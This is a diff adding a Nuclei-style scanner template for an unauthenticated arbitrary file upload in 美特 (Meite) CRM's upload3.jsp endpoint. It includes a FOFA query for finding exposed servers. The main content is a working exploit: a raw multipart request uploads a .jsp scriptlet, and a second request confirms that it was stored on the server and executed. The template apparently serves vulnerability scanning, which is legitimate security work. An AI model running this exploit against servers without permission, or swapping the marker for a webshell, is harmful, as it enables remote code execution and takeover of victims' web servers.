@@ -1,0 +1,77 @@
+id: meiteCRM-upload3_jsp-File-upload
+
+info:
+  name: "美特 CRM 系统 upload3.jsp 接口任意文件上传漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/common/scripts/basic.js"
+    美特CRM系统 /common/jsp/upload3.jsp 接口存在任意文件上传漏洞。攻击者无需身份验证即可通过该接口上传恶意文件，导致服务器端代码执行，植入后门程序并获取系统控制权限，最终实现对目标Web服务器的完全控制。
+  reference:
+  - https://mp.weixin.qq.com/s/aAZaFY1NQ_3wKQbEDNG1iQ
+  tags: 美特CRM
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /common/jsp/upload3.jsp?key=file&form=formdata&field=attach_name_1&filetitle=attach_title_1&folder=null&relativepath=null&%3E HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+    Content-Type: multipart/form-data; boundary=----geckoformboundaryc4e5992e491182d9864532ef66356073
+
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073
+    Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
+    Content-Type: application/octet-stream
+
+    <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073
+    Content-Disposition: form-data; name="key"
+
+    file
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073
+    Content-Disposition: form-data; name="form"
+
+    formdata
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073
+    Content-Disposition: form-data; name="field"
+
+    attach_name_1
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073
+    Content-Disposition: form-data; name="filetitile"
+
+    attach_title_1
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073
+    Content-Disposition: form-data; name="filefolder"
+
+    null
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073
+    Content-Disposition: form-data; name="relativepath"
+
+    null
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073--
+  extractors:
+  - type: regex
+    part: body
+    name: uploadfile
+    group: 1
+    regex:
+    - '(\w+\.jsp)'
+    internal: true
+- raw:
+  - |
+    GET /userfile/default/temp/{{uploadfile}} HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'pboyjnnrfipmplsukdeczudsefxmywe'
+  - type: status
+    status:
+    - 200
